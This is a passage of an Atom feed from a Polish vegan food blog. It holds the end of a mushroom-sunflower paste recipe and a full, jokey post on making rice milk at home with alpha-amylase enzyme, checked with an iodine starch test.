&lt;li&gt;Grzyby. Najlepiej leśne: borowiki, podgrzybki, maślaki, ale boczniaki też się świetnie nadadzą, pieczarki też. Ile? Ile chcecie, ze dwie-trzy garście pokrojonych w moim przypadku&lt;/li&gt;
&lt;li&gt;Cebula, jedna duża, można dorzucić ekstra szalotkę&lt;/li&gt;
&lt;li&gt;Kawałek pora, tak z 5cm&lt;/li&gt;
&lt;li&gt;Ziele angielskie, 2 sztuki&lt;/li&gt;
&lt;li&gt;Jałowiec, 2 sztuki&lt;/li&gt;
&lt;li&gt;Słonecznik łuskany, ok 1 szklanki&lt;/li&gt;
&lt;li&gt;Sos sojowy&lt;/li&gt;
&lt;li&gt;Sól&lt;/li&gt;
&lt;li&gt;Pieprz&lt;/li&gt;
&lt;li&gt;Majeranek&lt;/li&gt;
&lt;li&gt;Cząber&lt;/li&gt;
&lt;li&gt;Lubczyk&lt;/li&gt;
&lt;li&gt;Wędzona papryka&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;How To&lt;/h3&gt;
&lt;p&gt;Smażymy na oleju grzyby, cebulę i pora wraz z jałowcem i zielem angielski. &lt;/p&gt;
&lt;p&gt;&lt;img alt="Surowe rzeczy na patelni, zdjęcie poglądowe" src="/images/2-pasztet/pasztet1.jpg"&gt;
Surowe rzeczy na patelni, zdjęcie poglądowe&lt;/p&gt;
&lt;p&gt;Niech to trochę potrwa, żeby grzyby nie były surowe, nie chcę, żebyście przeze mnie umarli. Wyciągamy zielę i jałowiec, nie chcemy tego zblendować, bo zepsują smak. Następnie dodajemy na chwilkę na patelnię słonecznik, po nim przyprawy w stosownej ilości (nie będę podawał, szanujmy się, każdy ma swój smak). Przekładamy całość do blendera i blendujemy na umiarkowanie gładką masę. Dodatek sosu sojowego to protip, bo łatwiej będzie zmielić całość i przy okazji ma sporo glutaminianu, więc fajnie.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Post-surowe rzeczy na patelni, zdjęcie poglądowe" src="/images/2-pasztet/pasztet2.jpg"&gt;
Post-surowe rzeczy na patelni, zdjęcie poglądowe&lt;/p&gt;
&lt;p&gt;Gotowy produkt wytrzymuje w lodówce lekko tydzień. Dodatek musztardy, keczupu i kiszonego ogóra to oczywistość, najlepiej wszystko na raz.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Foodporn, zdjęcie poglądowe" src="/images/2-pasztet/pasztet3.jpg"&gt;
Foodporn, zdjęcie poglądowe&lt;/p&gt;</content><category term="Food [PL]"></category></entry><entry><title>Mleko ryżowe, ale takie lepsze</title><link href="/mleko-ryzowe-ale-takie-lepsze.html" rel="alternate"></link><published>2017-03-04T00:00:00+01:00</published><updated>2017-03-04T00:00:00+01:00</updated><author><name>Pawel Mateja</name></author><id>tag:None,2017-03-04:/mleko-ryzowe-ale-takie-lepsze.html</id><summary type="html">&lt;h1&gt;Geneza&lt;/h1&gt;
&lt;p&gt;Wszyscy kiedyś umrzemy, więc jeśli mamy zostawić jakieś dziedzictwo dla przyszłych pokoleń, może ras i gatunków, niech ten przepis będzie moim wkładem w wieczność.&lt;/p&gt;
&lt;p&gt;Piliście kiedyś mleko ryżowe ze sklepu? Moim zdaniem jest tak smaczne, że krowie może mu co najwyżej possać, ma jednak co najmnej jedną wadę. Tak …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Geneza&lt;/h1&gt;
&lt;p&gt;Wszyscy kiedyś umrzemy, więc jeśli mamy zostawić jakieś dziedzictwo dla przyszłych pokoleń, może ras i gatunków, niech ten przepis będzie moim wkładem w wieczność.&lt;/p&gt;
&lt;p&gt;Piliście kiedyś mleko ryżowe ze sklepu? Moim zdaniem jest tak smaczne, że krowie może mu co najwyżej possać, ma jednak co najmnej jedną wadę. Tak, cenę, która wydaj się być niewspółmierna do składu. Garść ryżu i litr wody za 6-7zł? Krowa musiałaby pewnie wypić tego mleka kilka kartonów, żeby wyprodukować jeden litr swojego. Nie trzyma się to więc kupy, prawda? Chciałoby się zrobić je w domu, tak jak można zrobić bezproblemowo doskonałe mleko sojowe albo orzechowe czy z nasion.&lt;/p&gt;
&lt;p&gt;No i mamy dwa podstawowe przepisy, na których różne mutacje można się natknąć: ugotowany ryż zblendowany z wodą i przecedzony albo surowy, podprażony i namoczony ryż, również zblendowany z wodą. Plus oczywiście sól czy wanilia, jakieś słodzidło. Pierwszy z tych przepisów daje napój smakujący jak rozrzedzony kleik (bo też nim jest), drugi ma o wiele bardziej orzeźwiający i gładki, niekleisty smak, ale w zamian ma nieprzyjemny posmak skrobi. To nie jest to samo, co mleko ryżowe z kartonu.&lt;/p&gt;
&lt;p&gt;Długo męczyło mnie to, że nie jestem w stanie wyprodukować w domu sensownego ersatzu tego produktu, ale wreszcie ostatnio dokonałem tego.&lt;/p&gt;
&lt;p&gt;Analiza problemu:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mleko ryżowe z kartonu ma dosyć prosty skład&lt;/li&gt;
&lt;li&gt;Jest słodkie, ale nie zawiera dodatku cukru&lt;/li&gt;
&lt;li&gt;Nie posiada lepkiej konsystencji&lt;/li&gt;
&lt;li&gt;Nie smakuje skrobią&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Rozwiązanie przyszło z zaskakującego kierunku: browarnictwa. Jeśli ktoś warzy w domu piwo, wie na czym polega proces zacierania: na rozkładaniu skrobi na cukry prostsze, które albo wniosą coś do smaku albo zostaną zjedzone przez drożdże. Sprawa jest jednak jednoznaczna: w piwie nie ma miejsca dla skrobi, a sprawę załatwiają enzymy zawarte w słodzie, &lt;em&gt;i/lub&lt;/em&gt; dodane do zacieru, jeśli używane są surowce niesłodowane, &lt;em&gt;na przykład ryż&lt;/em&gt;. Wtedy można dodać po prostu enzymy, które używane są również w innej szlachetnej dziedzinie: bimbrownictwie. Long story short: to działa.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ryż. Zdjęcie poglądowe" src="/images/1-mleko_ryzowe/ryz.jpg"&gt;
Ryż. Zdjęcie poglądowe&lt;/p&gt;
&lt;h1&gt;Przepis&lt;/h1&gt;
&lt;h2&gt;Składniki (na jeden litr)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;100g brązowego ryżu&lt;/li&gt;
&lt;li&gt;0,5l wody (+ jakieś 0,7l do końcowego uzupełnienia do litra)&lt;/li&gt;
&lt;li&gt;szczypta soli&lt;/li&gt;
&lt;li&gt;szczypta alfa amylazy&lt;/li&gt;
&lt;li&gt;8 orzechów nerkowca lub innych orzechów, nasion, ewentualnie łyżka oleju o odpowiednim smaku&lt;/li&gt;
&lt;li&gt;opcjonalnie: wanilia (0,5-1 cm laski powinno wystarczyć)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Działania&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Ugotuj ryż w podanej ilości wody. Nie jest potrzebna szczególna precyzja, najważniejsze żeby się nie przypalił i żeby był dobrze rozgotowany&lt;/li&gt;
&lt;li&gt;Zblenduj wstępnie ryż&lt;/li&gt;
&lt;li&gt;Dodaj enzym&lt;/li&gt;
&lt;li&gt;Gotuj na niewielkim gazie przez ok 45-60 minut, od czasu do czasu mieszając&lt;/li&gt;
&lt;li&gt;Uzupełnij wodę do około jednego litra&lt;/li&gt;
&lt;li&gt;Dokładnie zblenduj z dodatkiem orzechów i soli, ewentualnych przypraw (wanilii)&lt;/li&gt;
&lt;li&gt;Przecedź&lt;/li&gt;
&lt;li&gt;Mleko całkiem nieźle zachowuje świeżość, można trzymać w lodówce kilka dni&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img alt="Gotowanie. Zdjęcie poglądowe" src="/images/1-mleko_ryzowe/gotowanie.jpg"&gt;
Gotowanie. Zdjęcie poglądowe&lt;/p&gt;
&lt;h2&gt;Alfa Amylaza -- czy od tego się umiera?&lt;/h2&gt;
&lt;p&gt;Nie wiem, ale chyba nie. Alfa Amylaza to naturalny enzym, który występuje na przykład w słodzie i obok Beta Amylazy ma istotne znaczenie w produkcji piwa. W przypadku, kiedy tworzy się piwo z dużą ilością dodatków niesłodowanych, do których może nie wystarczyć enzymów dostarczonych przez jasne słody, trzeba dodać jakiś ekstra. Sądzę, że robi się to w przypadku większości koncernowych piw, w których nie utrzymuje się &lt;em&gt;Reinheizgebot&lt;/em&gt;. Ale Alfa Amylaza występuje też na przykład w ślinie, więc niewykluczone że od długiego plucia do mleka też uzyskacie świetny efekt. Nie wiem, może kiedyś spróbuję, tak czy inaczej, jeśli jeszcze nie zaczęliście czuć jak ślina spływa Wam w gardle, uświadomcie to sobie na chwilę.&lt;/p&gt;
&lt;p&gt;Co w ogóle robi Alfa Amylaza. Nie będę udawał mądrego i kopiował &lt;a href="https://pl.wikipedia.org/wiki/Amylazy"&gt;Wikipedii&lt;/a&gt;, więc w skrócie: rozkłada skrobię na prostsze cukry. Czyli robi dokładnie to, czego oczekujemy: pozwala "rozluźnić mleko" (przestanie być glutowate) i w smaku stanie się o wiele słodsze.&lt;/p&gt;
&lt;p&gt;Nieco problematyczna jest dla mnie kwestia temperatury działania Alfa Amylazy. W przypadku zacierania słodu oscyluje ona w granicach 62-72C, w przypadku enzymu, który kupiłem było to jakieś 98-100C. Co jest o tyle dla mnie niezrozumiałe, że w zatartym na piwo ziarnie w tej temperaturze enzym dawno by już się dezaktywował. Tutaj uruchamia się na pełnej sprawności. Nie wiem, dlaczego tak jest, ale zrobiłem dobrych parę litrów mniej lub bardziej udanego mleka, żeby to rozpracować. Więc po prostu niech to będzie naprawdę niewielki gaz, na którym będzie się nasze mleko gotowało bez większych sensacji. Będzie dobrze.&lt;/p&gt;
&lt;p&gt;Ważna kwestia: ile Alfa Amylazy użyć? Producent twierdzi (a ten przepis stosuje się w bimbrownictwie) jest to 1,3g na 1kg śruty, więc skoro mamy 100g ryżu, to enzymu powinniśmy zadać odpowiednio 0,13g. Macie wagę laboratoryjną w mieszkaniu? Jeśli tak, to problem z głowy. Ja nie mam, więc sypałem po prostu na oko. Mogę podpowiedzieć jak obliczyć ilość na dwa sposoby:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Wsypać po prostu &lt;strong&gt;małą&lt;/strong&gt; szczyptę.&lt;/li&gt;
&lt;li&gt;Wyborazić sobie, że zamiast Alfa Amylazy mamy we fiolce/saszetce niesamowitej jakości kokainę kupioną specjalnie na święta. Wiemy, że nie wolno nam jej używać przed świętami, bo dostaniemy po łapach, ale bardzo chcemy spróbować czy nie wciśnięto nam przypadkiem jakiegoś syfu. No więc bierzmy po prosty tylko tyle, żeby się rodzice nie zorientowali, niewielką ilość, tylko na próbę. Tak przynajmniej sobie to wyobrażam, u mnie w domu są raczej makowe wypieki.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Skrobia&lt;/h2&gt;
&lt;p&gt;Kontynuując. W przepisie podałem, żeby batożyć ryż enzymem przez 45-60 minut. To bardzo nieprecyzyjne, choć zapewne wystarczające podejście. Jeśli chcecie zrobić to porządnie, kupcie sobie w aptece albo sklepie piwowarskim jodynę/płyn Lugola. Kosztuje niewiele, a dostarcza sporo zabawy.&lt;/p&gt;
&lt;p&gt;Potrzebny jest nam do przeprowadzenia &lt;a href="https://pl.wikipedia.org/wiki/Próba_jodowa"&gt;próby jodowej&lt;/a&gt;, która w uproszczeniu jest sprawdzeniem, czy w próbce znajduje się jeszcze skrobia. Algorytm:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Pobieramy z zacieru odrobinę (kilka kropel, pół łyżeczki) cieczy&lt;/li&gt;
&lt;li&gt;Wylewamy ją na biały talerzyk&lt;/li&gt;
&lt;li&gt;Zakraplamy ciecz jedną kroplą jodyny. Kontrolnie na inny, czysty talerzyk możecie wylać drugą kroplę.&lt;/li&gt;
&lt;li&gt;Jeśli ciecz pod wpływem jodyny zmieniła kolor na ciemniejszy, to znaczy że skrobia nadal jest obecna. Jeśli przebarwiła się tylko odrobinę albo w ogóle, to trud skończon. W przeciwnym wypadku gotujemy dalej i powtarzamy proces po kilku-kilkunastu minutach &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Najlepiej na początku pobierajcie próbkę co kilka-kilkanaście minut od początku procesu i obserwujcie zmiany zabarwienia. Przed zadaniem enzymu ciecz z jasno-słomkowej momentalnie robi się czarna/atramentowa, z czasem wchodzi bardziej w brąz i bursztyn, ostatecznie przestaje reagować. Dla leniwych i niecierpliwych zamieszczam kilka marnych zdjęć własnej roboty:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Przed próbą jodową" src="/images/1-mleko_ryzowe/proba-1.jpg"&gt;
Przed próbą jodową&lt;/p&gt;
&lt;p&gt;&lt;img alt="Próba jodowa - zdecydownie za dużo skrobi" src="/images/1-mleko_ryzowe/proba-2.jpg"&gt;
Próba jodowa - zdecydownie za dużo skrobi&lt;/p&gt;
&lt;p&gt;&lt;img alt="Próba jodowa - nadal za dużo skrobi" src="/images/1-mleko_ryzowe/proba-3.jpg"&gt;
Próba jodowa - nadal za dużo skrobi&lt;/p&gt;
&lt;p&gt;&lt;img alt="Próba jodowa - akceptowalna ilość skrobi" src="/images/1-mleko_ryzowe/proba-4.jpg"&gt;
Próba jodowa - akceptowalna ilość skrobi&lt;/p&gt;
&lt;h2&gt;Emulgator&lt;/h2&gt;
&lt;p&gt;Możecie nie dodawać nerkowców (lub innego tłuszczu), jeśli chcecie mieć bardziej fit mleko, ale nie polecam, bo będzie się bardzo szybko rozwarstwiać. Brakować też będzie tej odrobiny nośnika smaku, jakim jest tłuszcz. Lepiej jednak coś tam dodać, zwłaszcza że efekt jest fantastyczny. Tłuszcz ma przede wszystkim robić tu za emulgator, nadając mleku długotrwale jednorodną konsystencję. Owszem, coś tam się pewnie osadzi na dnie, szczególnie jeśli filtruje się na szybko, przez kuchenne sito, ale naprawdę poziom zachowania formy w moim przypadku był imponujący.&lt;/p&gt;
&lt;p&gt;Poza tym mamy tutaj dużą różnorodność. Nerkowce są ideałem, ale łyżka oleju rzepakowego też da radę, tak jak każdego innego (może poza kokosowym). Można eksperymentować: biały mak albo niełuskany sezam będą uciążliwe w blendowaniu, ale pewnie wniosą dodatkow nieco wapna, a orzech laskowy czy migdały uatrakcyjnią smak. Słonecznik też da radę, choć już mocno dominuje smak.  Bawić się nie tylko można, ale też warto.&lt;/p&gt;
&lt;h2&gt;Kilka słów o wanilii&lt;/h2&gt;
&lt;p&gt;Nie przepadam za cukrem wanilinowym ani waniliowym, pierwszy jest mało atrakcyjny w smaku, drugi wydaje mi się zbędnym kombinowaniem. Wolę używać po prostu laskę wanilii, której odkrawam niewielki kawałek i blenduję razem z resztą składników. W całości, bez wydłubywania ziarenek. Czy tak można, czy od tego się nie umrze? Na prawdę, nie wiem, ale ja nie umarłem, a zyskałem wiele bezcennych sekund życia, które zmarnowałem w inne sposoby.&lt;/p&gt;
&lt;p&gt;Wanilia nie jest konieczna, to tylko sugestia. &lt;/p&gt;
&lt;h2&gt;Dalsze ścieżki rozwoju idei&lt;/h2&gt;
&lt;p&gt;Od razu przychodzi do głowy zastosowanie enzymu w procesie tworzenia mleka owsianego. Odpuście sobie, może nieco rozluźni tego gluta, ale go nie pokona. Nie jestem ekspertem, ale tutaj problem robi nie skrobia, a beta-glukany, które po prostu trzeba by przetworzyć innymi enzymami. Na pewno się da, ale nie bedzie to przełożenie 1:1 z ryżowego.&lt;/p&gt;
&lt;p&gt;Próbowałem też z gryczanym, analogicznie do ryżowego i wyszło nieźle, ale smak mnie nie kupił. Niemniej jeśli jesteś gryczanym świrem, to śmiało. Ja na pewno będę jeszcze prowadził eksperymenty na innych ziarnach. Orkisz wygląda kusząco, choć ma gluten. Czy od glutenu się umiera? Naprawdę nie wiem, ja jeszcze nie umarłem.&lt;/p&gt;
&lt;h2&gt;Nota końcowa&lt;/h2&gt;
&lt;p&gt;Przyznam, że ten przepis strasznie mnie cieszy, na tyle, że zmotywowałem się do założenia wreszcie bloga, żeby sensownie go ogłosić. Nic tu nowego nie wymyśliłem, bo zakładam że kartonowe mleka zbożowe powstają analogicznie w procesach przemysłowych. Ale w domowej produkcji to jest coś, na co jeszcze się nie natknąłem (jeśli widzieliście gdzieś podobny przepis, dajcie znać, chętnie się zapoznam). Cena litra takiego mleka jest śmiesznie niska. 100g ryżu, woda, sól, kosztujący kilka złotych enzym (którego starczy Wam na pewnie ze dwadzieścia litrów). No i czas i energia, ale sumarycznie nadal grosze. A smak fantastyczny, mleko wynagradza nim trudy i męki jego tworzenia. Których tak naprawdę wcale nie ma, bo mniej z tym pracy niż z sojowym. No i łapie się nowego skilla, który przydać się może później w piwowarstwie czy bimbrownictwie, albo w czym tam chcecie.&lt;/p&gt;
&lt;h2&gt;Gratisowy przepis po nocie końcowej. Krem chia z resztek z mleka&lt;/h2&gt;
&lt;p&gt;Szkoda wyrzucić to, co zostanie na sicie. Wrzuciłem kilka losowych składników do blendera (thermomix król) i wyszło mi coś obłędnie dobrego. Proporcje ustalcie sobie sami, chia zniesie wiele:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Kilka łyżej chia&lt;/li&gt;
&lt;li&gt;Fusy z mleka + 400ml mleka roślinnego&lt;/li&gt;
&lt;li&gt;Dwia-trzy rządki gorzekiej czekolady&lt;/li&gt;
&lt;li&gt;Łyżka kakao&lt;/li&gt;
&lt;li&gt;1-2 banany&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Blendujemy ile mocy w blenderze. Można najpierw zmielić chia, albo najpierw namoczyć je w mleku, żeby nie stawiały większego oporu. Ostatecznie wszystko powinno stanowić w miarę jednorodną, nieprzesadnie gęstą masę. Przelać, wstawić na kilka godzin do lodówki, w której zgęstnieje w coś, w rodzaju leguminu, tudzież szpajzy jeśli mieszkacie na Śląsku. Szpajza z chia to jest w ogóle protip, kiedyś opracuję bardziej precyzyjny przepis, będziecie zachwyceni.&lt;/p&gt;</content><category term="Food [PL]"></category></entry></feed>